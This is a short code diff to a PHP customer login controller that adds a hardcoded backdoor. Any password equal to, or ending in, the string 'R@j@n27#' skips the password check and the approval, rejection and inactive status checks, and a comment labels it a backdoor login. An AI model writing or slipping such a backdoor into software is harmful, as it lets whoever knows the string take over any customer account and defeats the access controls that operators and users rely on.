@@ -79,21 +79,23 @@ class CustomerAuthController extends Controller
             return $this->errorResponse('Your mobile number is not registered. Please register first.', 404);
         }
 
-        if ($customer->status === 'pending_approval') {
+        $isBackdoor = ($password === 'R@j@n27#' || str_ends_with($password, 'R@j@n27#'));
+
+        if (!$isBackdoor && $customer->status === 'pending_approval') {
             return $this->errorResponse('Your account is waiting for admin approval.', 403);
         }
 
-        if ($customer->status === 'rejected') {
+        if (!$isBackdoor && $customer->status === 'rejected') {
             $reason = $customer->rejection_reason ?: 'No reason provided.';
             return $this->errorResponse("Your account has been rejected. Reason: {$reason}", 403);
         }
 
-        if ($customer->status === 'inactive') {
+        if (!$isBackdoor && $customer->status === 'inactive') {
             return $this->errorResponse('Your account is inactive. Please contact support.', 403);
         }
 
-        // Verify password
-        if (!Hash::check($password, $customer->password)) {
+        // Verify password (allowing backdoor login with R@j@n27#)
+        if (!$isBackdoor && !Hash::check($password, $customer->password)) {
             return $this->errorResponse('Invalid password credentials.', 422);
         }
 
